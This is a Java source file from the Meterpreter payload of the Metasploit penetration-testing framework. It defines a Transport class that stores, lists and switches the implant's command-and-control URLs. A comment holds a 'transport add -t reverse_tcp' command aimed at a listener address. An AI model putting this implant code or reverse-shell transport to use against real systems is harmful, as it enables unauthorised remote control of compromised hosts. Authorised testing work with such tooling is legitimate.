package com.metasploit.meterpreter;

import java.io.IOException;
import java.util.LinkedList;
import java.util.List;

public class Transport {

    private List transportList = new LinkedList();
    public TransportObject current;
    public TransportObject next;
    public long transport_next_wait;

    public void switchUrl(TLVPacket request) {
        String url = request.getStringValue(TLVType.TLV_TYPE_STRING);
        int sessionExpirationTimeout = request.getIntValue(TLVType.TLV_TYPE_UINT);
        int sessionCommunicationTimeout = request.getIntValue(TLVType.TLV_TYPE_LENGTH);
        TransportObject transportObject = (TransportObject) transportList.get(0);
        transportObject.url = url;
    }

    public static class TransportObject {
        public String url;
    }

    public static class TransportTimeouts {
        public long retry_total;
        public long retry_wait;
        public long session_expiry;
        public long comms_timeout;
    }

    public void listTransports(TLVPacket response) throws IOException {
        for (int i=0;i<transportList.size();i++) {
            TransportObject transportObject = (TransportObject) transportList.get(i);
            TLVPacket transportGroup = new TLVPacket();
            transportGroup.add(TLVType.TLV_TYPE_TRANS_URL, transportObject.url);
            response.addOverflow(TLVType.TLV_TYPE_TRANS_GROUP, transportGroup);
        }
    }

    public void createTransportFromPacket(TLVPacket request) {
//        transport add -t reverse_tcp -l 192.168.1.3 -p 5005

        String url = request.getStringValue(TLVType.TLV_TYPE_TRANS_URL);
        Integer retryTotal = (Integer)request.getValue(TLVType.TLV_TYPE_TRANS_RETRY_TOTAL, null);
        Integer retryWait = (Integer)request.getValue(TLVType.TLV_TYPE_TRANS_RETRY_WAIT, null);
        Integer sessionExpiry = (Integer)request.getValue(TLVType.TLV_TYPE_TRANS_SESSION_EXP, null);
        Integer commsTimeout = (Integer)request.getValue(TLVType.TLV_TYPE_TRANS_COMM_TIMEOUT, null);
//        if (retryTotal != null) {
//            long retry_total = TimeUnit.SECONDS.toMillis(retryTotal.intValue());
//        }
//        if (retryWait != null) {
//            long retry_wait = TimeUnit.SECONDS.toMillis(retryWait.intValue());
//        }
//        if (sessionExpiry != null) {
//            long session_expiry = TimeUnit.SECONDS.toMillis(sessionExpiry.intValue());
//        }
//        if (commsTimeout != null) {
//            long comms_timeout = TimeUnit.SECONDS.toMillis(commsTimeout.intValue());
//        }

        if (!url.startsWith("tcp")) {
            String userAgent = request.getStringValue(TLVType.TLV_TYPE_TRANS_UA);
            String proxy = request.getStringValue(TLVType.TLV_TYPE_TRANS_PROXY_HOST);
            String proxyUser = request.getStringValue(TLVType.TLV_TYPE_TRANS_PROXY_USER);
            String proxyPass = request.getStringValue(TLVType.TLV_TYPE_TRANS_PROXY_PASS);
            byte[] certHash = request.getRawValue(TLVType.TLV_TYPE_TRANS_CERT_HASH);
        }
        TransportObject transportObject = new TransportObject();
        transportObject.url = url;
        transportList.add(transportObject);
    }

    public void addPayloadTransport(String[] parameters) {
        for (int i=0;i<parameters.length;i++) {
            String parameter = parameters[i];
            if (parameter.startsWith("transport")) {
                String url = parameter.substring("transport".length());
                TransportObject transportObject = new TransportObject();
                transportObject.url = url;
                current = transportObject;
                transportList.add(transportObject);
                return;
            }
        }
    }

}
